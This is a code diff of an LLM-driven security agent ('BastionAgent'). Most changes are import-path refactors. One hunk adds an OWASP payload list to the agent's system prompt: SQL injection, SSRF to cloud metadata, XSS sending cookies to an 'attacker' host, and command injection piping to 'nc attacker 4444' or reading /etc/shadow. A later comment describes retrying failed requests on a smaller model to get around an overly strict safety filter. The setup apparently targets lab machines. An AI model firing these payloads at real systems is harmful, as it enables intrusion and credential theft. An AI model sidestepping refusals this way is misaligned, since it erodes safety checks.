@@ -24,10 +24,10 @@ from typing import Generator
 
 import httpx
 
-from bastion.playbook import list_playbooks, load_playbook, run_playbook
-from bastion.prompt import build_system_prompt, build_planning_prompt
-from bastion.rag import build_index, format_context
-from bastion.skills import SKILLS, SKILL_CATEGORIES, execute_skill, preview_skill, skills_to_ollama_tools
+from packages.bastion.playbook import list_playbooks, load_playbook, run_playbook
+from packages.bastion.prompt import build_system_prompt, build_planning_prompt
+from packages.bastion.rag import build_index, format_context
+from packages.bastion.skills import SKILLS, SKILL_CATEGORIES, execute_skill, preview_skill, skills_to_ollama_tools
 
 
 # ── 입력 정제 ──────────────────────────────────────────────────────────────
@@ -606,7 +606,7 @@ class BastionAgent:
                  knowledge_dir: str = "", evidence_db: str = "",
                  approval_mode: str = "normal"):
         self.vm_ips = vm_ips
-        from bastion import LLM_BASE_URL, LLM_MANAGER_MODEL
+        from packages.bastion import LLM_BASE_URL, LLM_MANAGER_MODEL
         self.ollama_url = (ollama_url or LLM_BASE_URL).rstrip("/")
         self.model = model or LLM_MANAGER_MODEL
         self.history: list[dict] = []
@@ -617,12 +617,12 @@ class BastionAgent:
         self.approval_mode = approval_mode
 
         # Experience Learning Layer — 카테고리 수준 일반화 경험 학습
-        from bastion.experience import ExperienceLearner
+        from packages.bastion.experience import ExperienceLearner
         self.experience = ExperienceLearner(db_path=self.evidence_db.db_path)
 
         # History Layer (L4) — 시계열·내러티브·anchor·changelog. KG 와 동일 SQLite 공유.
         try:
-            from bastion.history import HistoryLayer
+            from packages.bastion.history import HistoryLayer
             self.history_layer = HistoryLayer()
         except Exception:
             self.history_layer = None
@@ -771,7 +771,7 @@ class BastionAgent:
         finally:
             # ── Audit 기록 (항상, 에러나도) ───────────────────────────────────
             try:
-                from bastion.audit import get_audit_log
+                from packages.bastion.audit import get_audit_log
                 duration_ms = int((_time.time() - t0) * 1000)
                 test_meta = getattr(self, "_test_meta", {}) or {}
                 verify_ctx = getattr(self, "_verify_context", {}) or {}
@@ -1110,7 +1110,7 @@ class BastionAgent:
                 self._update_assets_from_result(skill_name, params, success)
                 # 5a) Asset autoscan — probe 결과 → asset 노드 자동 등록
                 try:
-                    from bastion.asset_domain import autoscan_register
+                    from packages.bastion.asset_domain import autoscan_register
                     import re as _re
                     target = params.get("target", "")
                     out = output or ""
@@ -1479,7 +1479,7 @@ class BastionAgent:
         - 모델 호출 실패 시 조용히 빈 리스트 (무해)
         """
         try:
-            from bastion import LLM_SUBAGENT_MODEL
+            from packages.bastion import LLM_SUBAGENT_MODEL
             sub_model = LLM_SUBAGENT_MODEL
         except Exception:
             sub_model = "gemma3:4b"
@@ -1636,6 +1636,31 @@ class BastionAgent:
             "  · '결과 정리/요약/분석 리포트'                → qa\n"
             "  · 위 카테고리는 probe_all/probe_host 보다 shell/qa 가 잘 맞음 (probe 는 recon/포트스캔 전용).\n"
             "\n"
+            "## ★★ Web-vuln-ai 카테고리 — OWASP payload library (R3 32.5% → 50%+ 목표)\n"
+            "  ★ probe_all/probe_host 호출 절대 금지. shell 로 raw curl/python payload 작성.\n"
+            "  · A01 BAC/IDOR        → curl -b 'cookie' http://target/api/users/2 (다른 user ID 시도)\n"
+            "  · A03 SQLi (Boolean)  → curl 'http://target/?id=1%27%20OR%20%271%27=%271' (' OR '1'='1)\n"
+            "  · A03 SQLi (Time)     → curl 'http://target/?id=1%27%20AND%20SLEEP(5)--' (5초 지연 측정)\n"
+            "  · A03 SQLi (UNION)    → ' UNION SELECT NULL,version(),NULL-- (column 수 조정)\n"
+            "  · A03 NoSQL injection → curl -X POST http://target/login -d 'user[$ne]=&pass[$ne]='\n"
+            "  · A03 Stored/Reflected XSS → <script>fetch('//attacker/?c='+document.cookie)</script>\n"
+            "  · A05 SSRF cloud meta → curl 'http://target/?url=http://169.254.169.254/latest/meta-data/'\n"
+            "  · A05 SSRF file       → curl 'http://target/?url=file:///etc/passwd' (Gopher/Dict 도)\n"
+            "  · A06 의존성 (npm)    → npm audit --json | jq '.vulnerabilities'\n"
+            "  · A07 JWT alg=none    → jwt 헤더 변조: {\"alg\":\"none\"} + base64 (Burp/python jwt lib)\n"
+            "  · A07 JWT RS256→HS256 → public key 를 HMAC secret 으로 sign (jwt_tool.py)\n"
+            "  · A08 Deserialization → ysoserial.jar (Java) / phpggc (PHP) / pickle (Python)\n"
+            "  · Race / TOCTOU       → Burp Turbo Intruder (single-packet 30 req) 또는 python asyncio\n"
+            "  · SSTI Jinja2         → {{7*7}}, {{config.items()}}, {{''.__class__.__mro__[1].__subclasses__()}}\n"
+            "  · GraphQL Batch DoS   → POST /graphql [{q1: getUser(id:1)},...,{q1000: getUser(id:1000)}]\n"
+            "  · Prototype Pollution → JSON.parse('{\"__proto__\":{\"polluted\":true}}') Node.js\n"
+            "  · CORS 크리덴셜 leak  → fetch('http://victim/api',{credentials:'include'}) 외부 origin\n"
+            "  · CSRF                → <form action=http://victim/transfer method=POST><input name=to value=attacker>\n"
+            "  · HTTP Smuggling      → CL.TE / TE.CL hop (Content-Length + Transfer-Encoding 동시)\n"
+            "  · Path Traversal      → ../../../etc/passwd / %2e%2e%2f URL-encoded\n"
+            "  · Cmd Injection       → ; cat /etc/passwd / | nc attacker 4444 / `cat /etc/shadow`\n"
+            "  · 도구 미설치 시      → raw curl/python/ruby 으로 동등 효과 (sqlmap 없어도 manual SQLi 가능)\n"
+            "\n"
             "## 도구 호출 예시 (★ 첫 turn 패턴)\n"
             "예시1) user: '메모리 덤프 떠서 IoC 추출해'\n"
             "       → assistant: GOAL=메모리 보존+IoC. tool_call: memory_dump(target='web') → 결과 보고 ioc_export 호출.\n"
@@ -1686,7 +1711,7 @@ class BastionAgent:
         # KG-4: playbook lookup → reuse/adapt/new 결정
         lookup_result = None
         try:
-            from bastion.lookup import decide, build_lookup_prompt
+            from packages.bastion.lookup import decide, build_lookup_prompt
             lookup_result = decide(message, self.ollama_url, self.model)
             yield {"event": "lookup_decision",
                    "decision": lookup_result.get("decision"),
@@ -2144,11 +2169,11 @@ class BastionAgent:
             return  # tool 안 쓴 Q&A 는 그래프 학습에서 제외
 
         try:
-            from bastion.graph import get_graph
-            from bastion.playbook import (
+            from packages.bastion.graph import get_graph
+            from packages.bastion.playbook import (
                 write_playbook, update_exec_history, _slugify,
             )
-            from bastion.experience import CATEGORY_RULES
+            from packages.bastion.experience import CATEGORY_RULES
         except Exception:
             return
 
@@ -2517,7 +2542,7 @@ class BastionAgent:
         # w24 개선: Manager 모델 실패 시 SubAgent(작은 모델) 재시도
         # — 작은 모델이 더 직설적인 1줄 명령을 낼 때가 있음 (과도한 안전 필터 적응 유발)
         try:
-            from bastion import LLM_SUBAGENT_MODEL
+            from packages.bastion import LLM_SUBAGENT_MODEL
             sub_model = LLM_SUBAGENT_MODEL
         except Exception:
             sub_model = "gemma3:4b"
@@ -2877,7 +2902,7 @@ class BastionAgent:
 
     def _enrich_params(self, skill_name: str, params: dict) -> dict:
         """role 이름 → IP 자동 변환, skill 고정 target_vm 자동 주입."""
-        from bastion import INTERNAL_IPS
+        from packages.bastion import INTERNAL_IPS
         enriched = dict(params)
         skill_def = SKILLS.get(skill_name, {})
 
@@ -2905,7 +2930,7 @@ class BastionAgent:
 
     def _pre_check(self, skill_name: str, params: dict) -> tuple[bool, str]:
         """실행 전 타겟 VM 헬스 확인 (evidence-first)."""
-        from bastion import health_check, INTERNAL_IPS
+        from packages.bastion import health_check, INTERNAL_IPS
         skill_def = SKILLS.get(skill_name, {})
         target_vm = skill_def.get("target_vm", "auto")
 
@@ -3105,7 +3130,7 @@ class BastionAgent:
         for role, r_ip in self.vm_ips.items():
             if r_ip == ip:
                 return role
-        from bastion import INTERNAL_IPS
+        from packages.bastion import INTERNAL_IPS
         for role, r_ip in INTERNAL_IPS.items():
             if r_ip == ip:
                 return role
@@ -3176,7 +3201,7 @@ class BastionAgent:
 
         반환: skills_to_ollama_tools() 와 동일 형식 (subset).
         """
-        from bastion.skills import SKILLS, skills_to_ollama_tools
+        from packages.bastion.skills import SKILLS, skills_to_ollama_tools
         msg_low = (message or "").lower()
         scored: dict[str, int] = {}
         for sname in SKILLS:
@@ -3237,7 +3262,7 @@ class BastionAgent:
 
     def _update_assets_from_result(self, skill_name: str, params: dict, success: bool):
         """Skill 실행 결과로 Asset 상태 업데이트."""
-        from bastion import INTERNAL_IPS
+        from packages.bastion import INTERNAL_IPS
         status = "online" if success else "unreachable"
         if skill_name == "probe_all":
             for role, ip in self.vm_ips.items():
